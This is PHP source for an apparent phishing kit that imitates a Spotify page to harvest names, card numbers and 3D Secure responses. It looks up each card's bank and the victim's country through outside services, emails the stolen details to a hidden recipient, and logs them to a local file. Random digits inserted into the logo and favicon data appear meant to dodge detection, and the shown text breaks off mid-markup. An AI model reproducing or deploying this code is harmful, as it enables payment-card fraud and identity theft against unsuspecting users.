<?php @error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
include'../proxy.php';
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';	
require "../lang.php";
$bert=md5 (rand(0,10000));
$bero=md5 (rand(0,100000));
$bero1=md5 (rand(0,10000));
$bero2=md5 (rand(0,10000));
$bero3=md5 (rand(0,1000));
$bero4=md5 (rand(0,1000));
$bero5=md5 (rand(0,100000));
$bero6=md5 (rand(0,10000));
$bert4=md5 (rand(0,1000));
#################################################################################################################################
		$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
#################################################################################################################################
$dota = str_replace(".", "", $IP);
$rn = 'vi';
$sata = $rn . '' . $dota;

$yu = 'd';
$dun = $yu . '' . $dota;

if(isset($_POST['firstn'])) 
{ 
// Required field names
$required = array('firstn', 'vb');

// Loop over field names, make sure each one exists and is not empty
$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  header("HTTP/1.0 404 Not Found");
  die();
} else {


$cnum = $_POST['cnu'];
$bin = str_replace(' ', '', $cnum);
$bin = substr($bin, 0, 6);
function curl($url, $var = null) {
              $curl = curl_init($url);
              curl_setopt($curl, CURLOPT_TIMEOUT, 25);
              if ($var != null) {
                  curl_setopt($curl, CURLOPT_POST, true);
                  curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
              }
              curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
              curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
              $result = curl_exec($curl);
              curl_close($curl);
              return $result;
          }
          // JSON DATA
            $curl = curl('https://lookup.binlist.net/' . $bin . '');
            $json = json_decode($curl);
            $brand = $json->scheme ? $json->scheme : "error";
			$brandz = $json->brand ? $json->brand : "Gold";
            $cardType = $json->type ? $json->type : "error";
            $cardCategory = $json->bank ? $json->bank : "error";
			$prepai = $json->prepaid ? $json->prepaid : "no";
            $countryName = $json->country ? $json->country : "error";
			$catname = $cardCategory->name;
// -----
$ccbrand = $brandz;
$cctype = $brand;
$cclevel = $cardType;
$ccbank = $catname;
$prp = $prepai;

##############################################################################################################################################################
		include('mail.php');
##############################################################################################################################################################
##############################################################################################################################################################

		$fname = $_POST['firstn'];
		$lname = $_POST['lastn'];
		$vb = $_POST['vb'];
		$email = $_POST['email'];


##############################################################################################################################################################
$MESSAGE="<table cellpadding='0' cellspacing='0' align='center' border='0' bgcolor='#ffffff' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; width: 639px;'>
	<tr>
		<td width='600' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<table cellpadding='0' cellspacing='0' width='600' border='0'>
			<tr>
				<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
				<p>Dear <font color='#008000'>".$PRONAME."</font>,<hr></p>
				<p style=''>
				<img border='0' src='https://1.bp.blogspot.com/-Xrkf51hrYhE/XV6xGp86chI/AAAAAAAAAHg/eO0RbRmZdbYif07iog4TpRM6uOqIY1czQCLcBGAs/s1600/SPOT.png'></p>
				<p>&nbsp;</td>
			</tr>
			</table>
			<hr>
		</td>
		<td width='26' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
	</tr>
</table>
<table cellpadding='0' cellspacing='0' align='center' width='640' border='0' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; width: 640px; margin: auto;' height='187'>
	<tr>
	<td width='20' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<td width='800' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<table cellpadding='0' cellspacing='0' width='320px' border='0' height='89'>
			<tr>
				<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
				<strong>User VBV/3DSECURE Details</strong><br>First name : 
				<h>".$fname."</h><br>Last name : 
				<h>".$lname."</h><br>VBV/3D RESPONSE :
				<h>".$vb."</h></td>
			</tr>
		</table>
		</td>
		<td width='27' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<td width='376' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
		<table cellpadding='0' cellspacing='0' width='400px' border='0'>
			<tr>
				<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
				<strong>User Details</strong><br>
				IP  : <a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>
				COUNTRY  : <h> ".$COUNTRYNAME." - <font color='#FF6600'>".$COUNTRYCODE."</font> </h> <br>
				BROWSER & OS  : <h>".$device_details."</h><br>
				TIME  : <h>".date('l jS \of F Y h:i:s A')."</h></td>
			</tr>
		</table>
		</td>
	</tr>
</table>";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "$fname VBV/3D | $IP | $COUNTRYCODE";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: SPOTAsta v1 <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$setting = parse_ini_file('../conf.pak'); 
        $gettfe = $setting['emole']; 
        if($gettfe == 1) 
        {$CODED  ="link.php?$IP=".$COUNTRYNAME."&em=$email&e$dota&country=".$COUNTRYCODE."&".md5(microtime())."&$dota&s=".sha1(microtime());
	    }else{$CODED  ="id.php?$bert=".$COUNTRYNAME."&e$dota&em=$email&country=".$COUNTRYCODE."&$dota&".md5(microtime())."&s=".sha1(microtime());}
		header("Location: $CODED");
		$myfile = fopen("../rz/spoty-vbv-$bert.html", "a+") or die("Unable to open file!");
		fwrite($myfile, '-------------------------------- * VBV/3D Info * -------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
}




?>

<?php
if(isset($_GET[$dota]))
{
?>
<html id="app" lang="en" dir="ltr" ng-csp="" ng-strict-di="" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding"><?php echo $abtn; ?> - Spotıfy (<?php echo $_GET['country']; ?>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $bert; ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <base href=".">
  <link rel="icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM<?php echo rand(1, 9); ?>TExgR////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExjPExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL<?php echo rand(1, 9); ?>TExjvExMY7xMTGL<?php echo rand(1, 9); ?>TExi/ExMYgRMTGEH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <link href="../libs/index.css" media="screen" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8"></script>
  <meta http-equiv="<?php if(isset($_GET[$dun])) {echo 'refresh';}?>" content="4;url=https://cutt.ly/9wpju7l" />
</head>
<body ng-controller="LoginController" class="ng-scope">

<style>  
.head .bootstrap {
    background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 566.93 170.04' width='567' height='171'%3E%3Cpath d='M87.996 1.277c-46.<?php echo rand(1, 19); ?> 0-83.743 37.493-83.743 83.742 0 46.254 37.494 83.745 83.743 83.745 46.251 0 83.743-37.491 83.743-83.745 0-46.246-37.49-83.738-83.744-83.738zm38.404 120.78a5.217 5.217 0 0 1-7.177 1.737c-19.665-12.019-44.417-14.<?php echo rand(6, 8); ?>34-73.567-8.0<?php echo rand(6, 8); ?>5a5.217 5.217 0 0 1-6.249-3.925 5.212 5.212 0 0 1 3.926-6.249c31.9-7.293 59.263-4.154 81.336 9.334 2.46 1.51 3.24 4.72 1.73 7.18zm10.25-22.799c-1.894 3.073-5.912 4.037-8.981 2.15-22.505-13.834-56.822-17.841-83.447-9.759-3.453 1.043-7.1-.903-8.148-4.35a6.538 6.538 0 0 1 4.354-8.143c30.413-9.228 68.221-4.758 94.071 11.127 3.07 1.89 4.04 5.91 2.15 8.976zm.88-23.744c-26.994-16.031-71.52-17.505-97.289-9.684-4.138 1.255-8.514-1.081-9.768-5.219a7.835 7.835 0 0 1 5.221-9.771c29.581-8.98 78.756-7.245 109.83 11.202a7.833 7.833 0 0 1 2.737 10.733c-2.2 3.722-7.02 4.949-10.73 2.739zm94.56 3.072c-14.459-3.448-17.033-5.868-17.033-10.953 0-4.804 4.523-8.037 11.249-8.037 6.52 0 12.985 2.455 19.763 7.509a.<?php echo rand(5, 15); ?>.<?php echo rand(5, 15); ?> 0 0 0 .715.174.934.934 0 0 0 .625-.386l7.06-9.952a.949.949 0 0 0-.18-1.288c-8.067-6.473-17.151-9.62-27.769-9.62-15.612 0-26.517 9.369-26.517 22.774 0 14.375 9.407 19.465 25.663 23.394 13.836 3.187 16.171 5.857 16.171 10.63 0 5.289-4.722 8.577-12.321 8.577-8.44 0-15.324-2.843-23.025-9.512a.992.992 0 0 0-.695-.226.94.94 0 0 0-.65.334l-7.916 9.421a.94.94 0 0 0 .094 1.313c8.96 7.<?php echo rand(7, 9); ?>99 1<?php echo rand(7, 9); ?>.<?php echo rand(7, 9); ?>8 12.224 31.872 12.224 16.823 0 27.6<?php echo rand(7, 9); ?>4-9.192 27.6<?php echo rand(7, 9); ?>4-23.419.03-12.01-7.16-18.66-24.77-22.944zm62.86-14.26c-7.292 0-13.<?php echo rand(5, 15); ?> 2.872-18.205 8.757v-6.624a.949.949 0 0 0-.946-.949h-12.947a.948.948 0 0 0-.946.949v73.602c0 .523.423.949.946.949h12.947a.949.949 0 0 0 .946-.949v-23.233c4.933 5.536 10.915 8.241 18.205 8.241 13.549 0 27.265-10.43 27.265-30.368.02-19.943-13.7-30.376-27.25-30.376zm12.21 30.375c0 10.153-6.254 17.238-15.209 17.238-8.853 0-15.531-7.407-15.531-17.238 0-9.83 6.678-17.238 15.531-17.238 8.81-.001 15.21 7.247 15.21 17.237zm50.21-30.375c-17.449 0-31.119 13.436-31.119 30.592 0 16.969 13.576 30.264 30.905 30.264 17.511 0 31.223-13.391 31.223-30.481 0-17.031-13.62-30.373-31.01-30.373zm0 47.714c-9.281 0-16.278-7.457-16.278-17.344 0-9.929 6.755-17.134 16.064-17.134 9.341 0 16.385 7.457 16.385 17.351 0 9.927-6.8 17.127-16.17 17.127zm68.27-46.53h-14.247V50.<?php echo rand(7, 9); ?>44a.94<?php echo rand(5, 7); ?>.947 0 0 0-.945-.94<?php echo rand(1, 19); ?>h-12.945a.95.95 0 0 0-.949.948V65.51h-6.225a.947.947 0 0 0-.943.949v11.127c0 .522.422.949.943.949h6.225v28.791c0 11.635 5.791 17.534 17.212 17.534 4.644 0 8.497-.959 12.128-3.018a.944.944 0 0 0 .478-.821v-10.5<?php echo rand(1, 19); ?>6a.948.948 0 0 0-1.372-.85c-2.494 <?php echo rand(1, 19); ?>.255-4.905 1.834-7.6 1.834-4.154 0-6.007-1.886-6.007-6.113V78.54h14.247a.946.946 0 0 0 .944-.949V66.465a.918.918 0 0 0-.93-.949zm49.64.057v-1.789c0-5.263 2.018-7.61 6.544-7.61 2.699 0 4.867.536 7.295 1.346a.946.946 0 0 0 1.245-.902v-10.91a.947.947 0 0 0-.67-.909c-2.565-.763-5.<?php echo rand(6, 8); ?>47-1.546-10.761-1.546-11.958 0-18.279 6.734-18.279 19.467v2.74h-6.22a.952.952 0 0 0-.95.948v11.184c0 .522.428.949.95.949h6.22v44.409c0 .523.422.949.<?php echo rand(5, 15); ?>.949h12.947a.95.95 0 0 0 .949-.949V78.538h12.088l18.517 44.398c-2.102 4.665-4.169 5.593-6.991 5.593-2.281 0-4.683-.681-7.139-2.025a.972.972 0 0 0-.754-.071.957.957 0 0 0-.56.511l-4.388 9.62<?php echo rand(6, 8); ?>a.942.942 0 0 0 .408 1.225c4.581 2.481 8.<?php echo rand(4, 4); ?> 3.54 13.827 3.54 9.56 0 14.844-4.453 19.502-16.433l22.<?php echo rand(1, 3); ?>-58.04a.947.947 0 0 0-.879-1.293h-13.478a.951.951 0 0 0-.897.636l-13.807 39.438-15.123-39.464a.945.945 0 0 0-.884-.61h-22.12zm-28.78-.057h-12.947a.95.95 0 0 0-.949.949v56.485a.95.95 0 0 0 .949.949H446.5a.951.951 0 0 0 .949-.949V66.463a.947.947 0 0 0-.95-.949zm-6.4-25.719c-5.129 0-9.291 4.152-9.291 9.281 0 5.132 4.163 9.289 9.291 9.289 5.127 0 9.285-4.157 9.285-9.289 0-5.128-4.16-9.2<?php echo rand(6, 8); ?>1-9.28-9.281zm113.42 43.88c-5.124 0-9.111-4.115-9.111-9.112s4.039-9.159 9.159-9.159a9.074 9.074 0 0 1 9.111 9.107c0 4.997-4.04 9.164-9.16 9.164zm.05-17.365c-4.667 0-8.198 3.71-8.198 8.253 0 4.541 3.506 8.201 8.151 8.20<?php echo rand(1, 19); ?> 4.666 0 8.201-3.707 8.201-8.<?php echo rand(1, 19); ?>53 0-4.541-3.51-8.20<?php echo rand(1, 19); ?>-8.15-8.201zm2.02 9.138l2.577 3.608h-2.173l-2.32-3.31h-1.995v3.31h-1.819v-9.564h4.265c2.222 0 3.683 1.137 3.683 3.051.01 1.568-.9 2.526-2.21 2.905zm-1.54-4.315h-2.372v3.025h2.372c1.184 0 1.<?php echo rand(6, 8); ?>91-.579 1.891-1.514 0-.984-.71-1.511-1.<?php echo rand(6, 8); ?>9-1.511z'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-size: 100% 100%;
    background-size: 100%;
    display: inline-block;
    max-width: 100%;
    width: 200px;
}
</style> 

<div ng-include="template" class="ng-scope"><div sp-header="" class="ng-scope">
<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
<span class="sr-only"><?php echo $bert; ?></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<ul class="nav">
<li class="dropdown">
<a onclick="geo()" class="user-link dropdown-toggle hidden-xs hidden-sm"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a onclick="geo()" class="user-link hidden-md hidden-lg"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<ul class="dropdown-menu dropdown-menu-right">
<li><a><?php echo $bert; ?></a></li>
<li><a><?php echo $bert; ?></a></li>
</ul>
</li>
</ul>
<a onclick="geo()" class="user-link hidden"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a class="navbar-brand"><span class="navbar-logo"><?php echo $bert; ?></span></a>
</div>
<div class="collapse navbar-collapse" id="navbar-nav">
<ul class="nav navbar-nav navbar-right"><li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="dropdown alternate hidden-sidepanel">
<a onclick="geo()" class="user-link dropdown-toggle">
<div class="user-icon-container img-circle navbar-user-img">
